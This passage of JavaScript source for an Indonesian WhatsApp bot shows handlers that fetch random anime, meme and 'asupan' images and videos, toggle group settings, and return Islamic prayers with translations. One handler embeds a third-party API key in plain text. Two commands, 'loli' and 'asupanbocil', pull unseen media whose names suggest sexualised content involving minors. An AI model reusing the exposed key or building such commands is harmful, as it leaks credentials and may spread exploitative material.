contentText: `Klik Next untuk ke gambar selanjutnya`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 4
}

surya.sendMessage(from, buttonMessage, MessageType.buttonsMessage, {"contextInfo": {mentionedJid: [Suryaa, sender]}, quoted: msg})
break
}

switch(commands){
case 'waifu':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
limitAdd(sender, limit)
let wipu = (await axios.get(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/waifu.json`)).data
let wipi = wipu[Math.floor(Math.random() * (wipu.length))]
let mybel = await getBuffer(wipi)
let youra = await surya.prepareMessage(from, mybel, image)


const buttons = [
{buttonId: 'waifu', buttonText: {displayText: '➡️ Next'}, type: 1},
{buttonId: 'creator', buttonText: {displayText: 'Creator Bot'}, type: 1},
]
const buttonMessage = {
imageMessage: youra.message.imageMessage,
contentText: `Klik Next untuk ke gambar selanjutnya`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 4
}

surya.sendMessage(from, buttonMessage, MessageType.buttonsMessage, {"contextInfo": {mentionedJid: [Suryaa, sender]}, quoted: msg})
break
}

switch(commands){
case 'loli':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
limitAdd(sender, limit)
let wipu = (await axios.get(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/loli.json`)).data
let wipi = wipu[Math.floor(Math.random() * (wipu.length))]
let mybel = await getBuffer(wipi)
let youra = await surya.prepareMessage(from, mybel, image)


const buttons = [
{buttonId: 'loli', buttonText: {displayText: '➡️ Next'}, type: 1},
{buttonId: 'creator', buttonText: {displayText: 'Creator Bot'}, type: 1},
]
const buttonMessage = {
imageMessage: youra.message.imageMessage,
contentText: `Klik Next untuk ke gambar selanjutnya`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 4
}

surya.sendMessage(from, buttonMessage, MessageType.buttonsMessage, {"contextInfo": {mentionedJid: [Suryaa, sender]}, quoted: msg})
break
}

switch(commands){
case 'wallml':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
limitAdd(sender, limit)
let wipu = (await axios.get(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/wallml.json`)).data
let wipi = wipu[Math.floor(Math.random() * (wipu.length))]
let mybel = await getBuffer(wipi)
let youra = await surya.prepareMessage(from, mybel, image)


const buttons = [
{buttonId: 'wallml', buttonText: {displayText: '➡️ Next'}, type: 1},
{buttonId: 'creator', buttonText: {displayText: 'Creator Bot'}, type: 1},
]
const buttonMessage = {
imageMessage: youra.message.imageMessage,
contentText: `Klik Next untuk ke gambar selanjutnya`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 4
}

surya.sendMessage(from, buttonMessage, MessageType.buttonsMessage, {"contextInfo": {mentionedJid: [Suryaa, sender]}, quoted: msg})
break
}

switch(commands){
case 'creator':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 

surya.sendContact(from, `${Suryaa}'("@")'`, 'ᴹᴿ᭄𝑺𝒖𝒓𝒚𝒂ㄙ×፝֟͜×⁩', msg)
setTimeout( () => {
const buttons = [
{buttonId: 'script', buttonText: {displayText: 'Sc bot'}, type: 1},
{buttonId: 'instag', buttonText: {displayText: 'Instagram'}, type: 1},

]
const buttonMessage = {
contentText: `NIH KONTAK CREATOR GUA`,
buttons: buttons,
headerType: 1
}

surya.sendMessage(from, buttonMessage, MessageType.buttonsMessage, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
}, 1000)
break
}
switch(butt) {
case 'instag':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
reply(`Jangan lupa follow IG creator ya :
https://www.instagram.com/surya_skylark05/`)
break
}
switch(butt) {
case 'script':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
textImg(`Bot ini menggunakan sc :
https://github.com/Jabalsurya2105/MechaBotz

Private awokawok:v`)
break
}
switch(commands){
case 'meme':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 

const buttons = [
{buttonId: 'memeid', buttonText: {displayText: 'Meme Indo'}, type: 1},
{buttonId: 'oncak', buttonText: {displayText: 'Wancak'}, type: 1},
]

const buttonMessage = {
contentText: `${Ucapan} @${sender.split('@')[0]}
${sholat}

Silahkan Pilih Salah Satu Di Bawah`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 1
}

surya.sendMessage(from, buttonMessage, MessageType.buttonsMessage, {
thumbnail: fs.readFileSync('./media/Surya.jpg'),
 "contextInfo": {
mentionedJid: [Suryaa, sender]},
quoted: ftroli})
break
}
switch(butt) {
case 'memeid':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let gambur = `https://api.lolhuman.xyz/api/meme/memeindo?apikey=${lolkey}`
let gambar = await getBuffer(gambur)
let youra = await surya.prepareMessage(from, gambar, image, {thumbnail: gambar})
limitAdd(sender, limit)

const buttons = [
{buttonId: 'memeid', buttonText: {displayText: 'NEXT ➡️'}, type: 1},
]
const buttonMessage = {
imageMessage: youra.message.imageMessage,
contentText: `Nih Kak @${sender.split('@')[0]}`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 4
}
surya.sendMessage(from, buttonMessage, MessageType.buttonsMessage, {
thumbnail: fs.readFileSync('./media/Surya.jpg'),
 "contextInfo": {
mentionedJid: [Suryaa, sender]},
quoted: ftroli})
break
}
switch(butt) {
case 'oncak':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let gambur = `https://api.lolhuman.xyz/api/onecak?apikey=${lolkey}`
let gambar = await getBuffer(gambur)
let youra = await surya.prepareMessage(from, gambar, image, {thumbnail: gambar})
limitAdd(sender, limit)

const buttons = [
{buttonId: 'oncak', buttonText: {displayText: 'NEXT ➡️'}, type: 1},
]
const buttonMessage = {
imageMessage: youra.message.imageMessage,
contentText: `Nih Kak @${sender.split('@')[0]}`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 4
}
surya.sendMessage(from, buttonMessage, MessageType.buttonsMessage, {
thumbnail: fs.readFileSync('./media/Surya.jpg'),
 "contextInfo": {
mentionedJid: [Suryaa, sender]},
quoted: ftroli})
break
}
switch(commands){
case 'asupanbutton':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 

const buttons = [
{buttonId: 'asupboc', buttonText: {displayText: '𝑨𝒔𝒖𝒑𝒂𝒏 𝑩𝒐𝒄𝒊𝒍'}, type: 1},
{buttonId: 'asup62', buttonText: {displayText: '𝑨𝒔𝒖𝒑𝒂𝒏 +62'}, type: 1},
]

const buttonMessage = {
contentText: `${Ucapan} @${sender.split('@')[0]}
${sholat}

Silahkan Pilih Salah Satu Di Bawah`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 1
}

surya.sendMessage(from, buttonMessage, MessageType.buttonsMessage, {
thumbnail: fs.readFileSync('./media/Surya.jpg'),
 "contextInfo": {
mentionedJid: [Suryaa, sender]},
quoted: ftroli})
break
}
switch(butt) {
case 'asupboc':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let gambur = `https://dapuhy-api.herokuapp.com/api/asupan/asupanbocil?apikey=ItsMeKo`
let gambar = await getBuffer(gambur)
let youra = await surya.prepareMessage(from, gambar, video)
limitAdd(sender, limit)

const buttons = [
{buttonId: 'asupboc', buttonText: {displayText: 'NEXT ➡️'}, type: 1},
]
const buttonMessage = {
videoMessage: youra.message.videoMessage,
contentText: `Nih Kak @${sender.split('@')[0]}`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 5
}
surya.sendMessage(from, buttonMessage, MessageType.buttonsMessage, {
thumbnail: fs.readFileSync('./media/Surya.jpg'),
 "contextInfo": {
mentionedJid: [Suryaa, sender]},
quoted: ftroli})
break
}
switch(butt) {
case 'asup62':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let gambur = `https://dapuhy-api.herokuapp.com/api/asupan/asupan?apikey=ItsMeKo`
let gambar = await getBuffer(gambur)
let youra = await surya.prepareMessage(from, gambar, video)
limitAdd(sender, limit)

const buttons = [
{buttonId: 'asup62', buttonText: {displayText: 'NEXT ➡️'}, type: 1},
]
const buttonMessage = {
videoMessage: youra.message.videoMessage,
contentText: `Nih Kak @${sender.split('@')[0]}`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 5
}
surya.sendMessage(from, buttonMessage, MessageType.buttonsMessage, {
thumbnail: fs.readFileSync('./media/Surya.jpg'),
"contextInfo": {
mentionedJid: [Suryaa, sender]},
quoted: ftroli})
break
}

switch(commands){
case 'grup': case 'group': case 'gc':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isGroup) return reply(mess.OnlyGrup)
if (isMuted) return
if (isBan) return 
if (!isGroupAdmins) return reply(mess.GrupAdmin)

const buttons = [
{buttonId: 'id23', buttonText: {displayText: 'OPEN BO'}, type: 1},
{buttonId: 'id24', buttonText: {displayText: 'CLOSE BO'}, type: 1},
]

const buttonMessage = {
contentText: `*〔 Button Setting Group 〕*

${Ucapan} @${sender.split('@')[0]} Silahkan pilih salah satu dibawah 🌹`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttons,
headerType: 1
}

surya.sendMessage(from, buttonMessage, MessageType.buttonsMessage, {
thumbnail: fs.readFileSync('./media/Surya.jpg'),
 "contextInfo": {
mentionedJid: [Suryaa, sender]},
quoted: ftroli})
break
}
switch(butt) {
case 'id24':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroupAdmins && !isOwner && !isOwner2)return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
surya.groupSettingChange(from, "announcement", true)
break
}
switch(butt) {
case 'id23':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroupAdmins && !isOwner && !isOwner2)return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
surya.groupSettingChange(from, "announcement", false)
break
}

switch(commands){
case 'ayatkursi': case 'ayatk':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
textImg(`
*AYAT KURSI*

*Arab :* اَللّٰهُ لَآ اِلٰهَ اِلَّا هُوَۚ اَلْحَيُّ الْقَيُّوْمُ ەۚ لَا تَأْخُذُهٗ سِنَةٌ وَّلَا نَوْمٌۗلَهٗ مَا فِى السَّمٰوٰتِ وَمَا فِى الْاَرْضِۗ مَنْ ذَا الَّذِيْ يَشْفَعُ عِنْدَهٗٓ اِلَّا بِاِذْنِهٖۗ يَعْلَمُ مَا بَيْنَ اَيْدِيْهِمْ وَمَا خَلْفَهُمْۚ وَلَا يُحِيْطُوْنَ بِشَيْءٍ مِّنْ عِلْمِهٖٓ اِلَّا بِمَا شَاۤءَۚ وَسِعَ كُرْسِيُّهُ السَّمٰوٰتِ وَالْاَرْضَۚ وَلَا يَـُٔوْدُهٗ حِفْظُهُمَاۚ وَهُوَ الْعَلِيُّ الْعَظِيْمُ

*Latin :* Alloohu laa ilaaha illaa huwal hayyul qoyyuum, laa ta’khudzuhuu sinatuw walaa naum. Lahuu maa fissamaawaati wa maa fil ardli man dzal ladzii yasyfa’u ‘indahuu illaa biidznih, ya’lamu maa baina aidiihim wamaa kholfahum wa laa yuhiithuuna bisyai’im min ‘ilmihii illaa bimaa syaa’ wasi’a kursiyyuhus samaawaati wal ardlo walaa ya’uuduhuu hifdhuhumaa wahuwal ‘aliyyul ‘adhiim.

*Indonesia :* Allah, tidak ada tuhan selain Dia. Yang Mahahidup, Yang terus menerus mengurus (makhluk-Nya), tidak mengantuk dan tidak tidur. Milik-Nya apa yang ada di langit dan apa yang ada di bumi. Tidak ada yang dapat memberi syafaat di sisi-Nya tanpa izin-Nya. Dia mengetahui apa yang di hadapan mereka dan apa yang di belakang mereka, dan mereka tidak mengetahui sesuatu apa pun tentang ilmu-Nya melainkan apa yang Dia kehendaki. Kursi-Nya meliputi langit dan bumi. Dan Dia tidak merasa berat memelihara keduanya, dan Dia Mahatinggi, Mahabesar.

*Tafsir:* Allah adalah Tuhan Yang Maha Esa, tidak ada tuhan selain Dia, dan hanya Dia yang berhak untuk disembah. Adapun tuhan-tuhan yang lain yang disembah oleh sebagian manusia dengan alasan yang tidak benar, memang banyak jumlahnya. Akan tetapi Tuhan yang sebenarnya hanyalah Allah. Hanya Dialah Yang hidup abadi, yang ada dengan sendiri-Nya, dan Dia pulalah yang selalu mengatur makhluk-Nya tanpa ada kelalaian sedikit pun.

Kemudian ditegaskan lagi bahwa Allah tidak pernah mengantuk. Orang yang berada dalam keadaan mengantuk tentu hilang kesadarannya, sehingga dia tidak akan dapat melakukan pekerjaannya dengan baik, padahal Allah swt senantiasa mengurus dan memelihara makhluk-Nya dengan baik, tidak pernah kehilangan kesadaran atau pun lalai.

Karena Allah tidak pernah mengantuk, sudah tentu Dia tidak pernah tidur, karena mengantuk adalah permulaan dari proses tidur. Orang yang tidur lebih banyak kehilangan kesadaran daripada orang yang mengantuk.

Sifat Allah yang lain yang disebutkan dalam ayat ini ialah bahwa Dialah yang mempunyai kekuasaan dan yang memiliki apa yang ada di langit dan di bumi. Dialah yang mempunyai kekuatan dan kekuasaan yang tak terbatas, sehingga Dia dapat berbuat apa yang dikehendaki-Nya. Semuanya ada dalam kekuasaan-Nya, sehingga tidak ada satu pun dari makhluk-Nya termasuk para nabi dan para malaikat yang dapat memberikan pertolongan kecuali dengan izin-Nya, apalagi patung-patung yang oleh orang-orang kafir dianggap sebagai penolong mereka.

Yang dimaksud dengan "pertolongan" atau "syafaat" dalam ayat ini ialah pertolongan yang diberikan oleh para malaikat, nabi dan orang-orang saleh kepada umat manusia pada hari kiamat untuk mendapatkan keringanan atau kebebasan dari hukuman Allah. Syafaat itu akan terjadi atas izin Allah. Dalam hadis disebutkan :

Nabi Saw bersabda,
Kemudian Allah berfirman, "Para Malaikat memberikan syafaat, para Nabi memberikan syafaat, dan orang-orang mukmin juga memberikan syafaat. (Riwayat Ahmad dan Muslim dari Abu Sa'id al-Khudri)

Sifat Allah yang lain yang disebutkan dalam ayat ini ialah: bahwa Allah senantiasa mengetahui apa saja yang terjadi di hadapan dan di belakang makhluk-Nya, sedang mereka tidak mengetahui sesuatu pun dari ilmu Allah, melainkan sekadar apa yang dikehendaki-Nya untuk mereka ketahui. Kursi Allah mencakup langit dan bumi. Allah tidak merasa berat sedikit pun dalam memelihara makhluk-Nya yang berada di langit dan di bumi, dan di semua alam ciptaan-Nya. Allah Mahatinggi lagi Mahabesar.

Mereka tidak mengetahui ilmu Allah, kecuali apa yang telah dikehendaki-Nya untuk mereka ketahui. Dengan demikian, yang dapat diketahui oleh manusia hanyalah sekadar apa yang dapat dijangkau oleh pengetahuan yang telah dikaruniakan Allah kepada mereka, dan jumlahnya amat sedikit dibanding dengan ilmu-Nya yang luas. Hal ini ditegaskan Allah dalam firman-Nya:

Sedangkan kamu diberi pengetahuan hanya sedikit. (al-Isra'/17:85)`)
}
break
case 'doaharian1':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBan) return 
textImg(`
*Title :* Doa Sebelum Makan

*Arab :* اَللّٰهُمَّ بَارِكْ لَنَا فِيْمَا رَزَقْتَنَا وَقِنَا عَذَابَ النَّارِ

*Latin :* Alloohumma barik lanaa fiimaa razatanaa waqinaa 'adzaa bannar

*Indonesia :* Ya Allah berkahilah kami dalam rezeki yang telah Engkau berikan kepada kami dan peliharalah kami dari siksa api neraka`)
limitAdd(sender, limit)
}
break
case 'doaharian2':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBan) return 
textImg(`
*Title :* Doa Sesudah Makan

*Arab :* اَلْحَمْدُ ِللهِ الَّذِىْ اَطْعَمَنَا وَسَقَانَا وَجَعَلَنَا مُسْلِمِيْنَ

*Latin :* Alhamdu lillaahil ladzii ath'amanaa wa saqoonaa wa ja'alnaa muslimiin

*Indonesia :* Segala puji bagi Allah yang telah memberi makan kami dan minuman kami serta menjadikan kami sebagai orang-orang islam`)
limitAdd(sender, limit)
}
break
case 'doaharian3':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBan) return 
textImg(`
*Title :* Doa SesudahMinum

*Arab :* اَلْحَمْدُ ِللهِ الَّذِىْ جَعَلَهُ عَذْبًا فُرَاتًا بِرَحْمَتِهِ وَلَمْ يَجْعَلْهُ مِلْحًا اُجَاجًا بِذُنُوْبِنَا

*Latin :* Alhamdu lillaahil ladzi ja'alahuu 'adzbam furootam birohmatihii wa lamyaj'alhu milhan ujaajam bidzunuubinaa

*Indonesia :* Segala puji bagi Allah yang telah menjadikan air ini (minuman) segar dan menggiatkan dengan rahmat-Nya dan tidak menjadikan air ini (minuman) asin lagi pahit karena dosa-dosa kami`)
limitAdd(sender, limit)
}
break
case 'doaharian4':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBan) return 
textImg(`
*Title :* Doa Ketika Makan Lupa Membaca Doa

*Arab :* بِسْمِ اللهِ فِىِ أَوَّلِهِ وَآخِرِهِ

*Latin :* Bismillaahi fii awwalihi wa aakhirihi

*Indonesia :* Dengan menyebut nama Allah pada awal dan akhirnya`)
limitAdd(sender, limit)
}
break
case 'doaharian5':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBan) return 
textImg(`
*Title :* Doa Sebelum Tidur

*Arab :* بِسْمِكَ اللّٰهُمَّ اَحْيَا وَاَمُوْتُ

*Latin :* Bismikallohumma ahya wa amuutu

*Indonesia :* Dengan menyebut nama-Mu ya Allah aku hidup dan aku mati`)
limitAdd(sender, limit)
}
break
case 'doaharian6':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBan) return 
textImg(`
*Title :* Doa Ketika Mimpi Buruk

*Arab :* اَللّٰهُمَّ إِنّىِ أَعُوْذُ بِكَ مِنْ عَمَلِ الشَّيْطَانِ وَسَيِّئاَتِ اْلأَحْلاَمِ

*Latin :* Allaahumma innii a'uudzubika min 'amalisy syaithaani wa sayyiaatil ahlami

*Indonesia :* Ya Allah sesungguhnya aku mohon perlindungan kepada Engkau dari perbuatan setan dan dari mimpi-mimpi yang buruk`)
limitAdd(sender, limit)
}
break
case 'doaharian7':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBan) return 
textImg(`
*Title :* Doa Ketika Mendapat Mimpi Baik

*Arab :* اَلْحَمْدُ ِللهِ الَّذِيْ قَطْلَ الْحَاجَتِ

*Latin :* Alhamdulillahil ladzii qodzoo haajaati

*Indonesia :* Segala puji bagi Allah yang telah memberi hajatku`)
limitAdd(sender, limit)
}
break
case 'doaharian8':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBan) return 
textImg(`
*Title :* Doa Bangun Tidur

*Arab :* اَلْحَمْدُ ِللهِ الَّذِىْ اَحْيَانَا بَعْدَمَآ اَمَاتَنَا وَاِلَيْهِ النُّشُوْرُ

*Latin :* Alhamdu lillahil ladzii ahyaanaa ba'da maa amaa tanaa wa ilahin nusyuuru

*Indonesia :* Segala puji bagi Allah yang telah menghidupkan kami sesudah kami mati (membangunkan dari tidur) dan hanya kepada-Nya kami dikembalikan`)
limitAdd(sender, limit)
}
break
case 'doaharian9':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBan) return 
textImg(`
*Title :* Doa Masuk Kamar Mandi Atau Toilet

*Arab :* اَللّٰهُمَّ اِنّىْ اَعُوْذُبِكَ مِنَ الْخُبُثِ وَالْخَبَآئِثِ

*Latin :* Alloohumma Innii a'uudzubika minal khubutsi wal khoaaitsi

*Indonesia :* Ya Allah aku berlindung pada-Mu dari godaan syetanlaki-laki dan setan perempuan`)
limitAdd(sender, limit)
}
break
case 'doaharian10':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBan) return 
textImg(`
*Title :* Doa Istinja

*Arab :* اَللّٰهُمَّ حَسِّنْ فَرْجِىْ مِنَ الْفَوَاخِشِ وَظَهِّرْ قَلْبِيْ مِنَ النِّفَاقِ

*Latin :* Alloohumma thahhir qolbii minan nifaaqi wa hashshin fajrii minal fawaahisyi

*Indonesia :* Wahai Tuhanku sucikanlah hatiku dari sifat kepura-puraan (munafiq) serta peliharalah kemaluanku dari perbuatan keji`)
limitAdd(sender, limit)
}
break
case 'doaharian11':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBan) return 
textImg(`
*Title :* Doa Keluar Kamar Mandi Atau Toilet

*Arab :* غُفْرَانَكَ الْحَمْدُ ِللهِ الَّذِىْ اَذْهَبَ عَنّى اْلاَذَى وَعَافَانِىْ

*Latin :* Ghufraanaka. Alhamdulillaahil ladzii adzhaba ‘annjil adzaa wa’aafaanii

*Indonesia :* Dengan mengharap ampunanMu segala puji milik Allah yang telah menghilangkan kotoran dari badanku dan yang telah menyejahterakan`)
limitAdd(sender, limit)
}
break
case 'doaharian12':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBan) return 
textImg(`
*Title :* Doa Menjelang Sholat Shubuh

*Arab :* اَللّٰهُمَّ اِنِّى اَعُوْذُ بِكَ مِنْ ضِيْقِ الدُّنْيَا وَضِيْقِ يَوْمِ الْقِيَامَةِ

*Latin :* Alloohumma inni a'udzubika min dzhiiqid-dunyaa wa dzhiiqi yaumal-qiyaamati

*Indonesia :* Ya Allah Sesungguhnya aku berlindung kepada-Mu dari kesempitan dunia dan kesempitan hari kiamat. (HR. Abu Daud)`)
limitAdd(sender, limit)
}
break
case 'doaharian13':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBan) return 
textImg(`
*Title :* Doa Menyambut Pagi hari

